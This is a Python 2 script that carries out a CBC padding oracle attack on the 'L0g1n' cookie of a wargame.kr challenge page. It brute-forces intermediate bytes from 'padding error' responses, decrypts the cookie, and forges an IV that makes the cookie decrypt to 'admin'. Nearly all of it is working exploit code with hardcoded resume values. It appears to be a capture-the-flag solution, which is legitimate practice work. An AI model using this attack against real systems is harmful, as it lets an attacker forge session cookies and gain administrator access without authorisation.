# -*- coding: utf-8 -*-
__author__ = 'angelwhu'

import base64
import requests
import urllib

iv = base64.b64decode("IDCq+/MbRP0=")  # iv length is 8
cipher = base64.b64decode("EzDYjiFgH1Q=") # cipher length is 8
block_size = 8

immediate_value = [ -1 for i in range(block_size)]

session = requests.session()
session.cookies['ci_session']='******'

immediate_value = [-1, -1, 207, 136, 135, 24, 71, 254] #出错后，重新开始开始。
ajust_round = 6  #出错后，从新的round开始,初始为0
ajust_tempiv = 0 #出错后，设置新的处理tempiv。原来是0  如果立即数在0-8之间，会误认为是padding而出错。

for round in range(ajust_round,block_size):
    temp_iv =""
    for j in range(block_size-round,block_size):
        temp_iv = temp_iv + chr(immediate_value[j]^(round+1))

    res = -1
    for i in range(0xff):
        #temp = chr(0)*(block_size-1-round) + chr(i) + temp_iv
        temp = chr(ajust_tempiv)*(block_size-1-round) + chr(i) + temp_iv
        #print temp
        session.cookies['L0g1n'] = urllib.quote(base64.b64encode(temp)+base64.b64encode(cipher))
        print i
        response = session.get('http://wargame.kr:8080/dun_worry_about_the_vase/main.php')
        #print session.cookies
        if 'padding error' in response.text:
            #print "666"
            #print response.text
            None
        else:
            res = i
            print i
            print "666"
            break
    if res == -1:
        #print session.cookies
        print round
        print immediate_value
        print "dddderrrrrrrrrrrrrrrrrrr"
        exit()
    else:
        #print session.cookies
        print response.text
        print res
        immediate_value[block_size-1-round ] = res ^ (1+round)
        print immediate_value

immediate_value = [71, 69, 207, 136, 135, 24, 71, 254]

plain = ""
for i in range(block_size):
    plain = plain + chr(ord(iv[i])^immediate_value[i])
print plain

target_plain = "admin" + "\x03"*3
target_iv = ""
for i in range(block_size):
    target_iv = target_iv + chr(ord(target_plain[i])^immediate_value[i])
print base64.b64encode(target_iv)




